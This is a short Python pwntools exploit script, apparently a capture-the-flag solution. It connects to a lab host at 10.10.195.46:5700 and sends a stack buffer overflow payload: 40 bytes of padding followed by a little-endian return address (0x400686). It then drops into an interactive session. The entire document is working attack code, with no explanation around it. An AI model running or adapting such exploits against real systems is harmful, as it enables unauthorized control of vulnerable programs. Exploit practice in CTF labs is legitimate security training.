from multiprocessing import context
from pwn import *


con = remote('10.10.195.46', 5700)

payload  = 'A'*32
payload += 'B'*8
payload += '\x86\x06\x40\x00\x00\x00\x00\x00'

con.recvuntil("What's your name: ")
con.sendline(payload)
con.interactive()
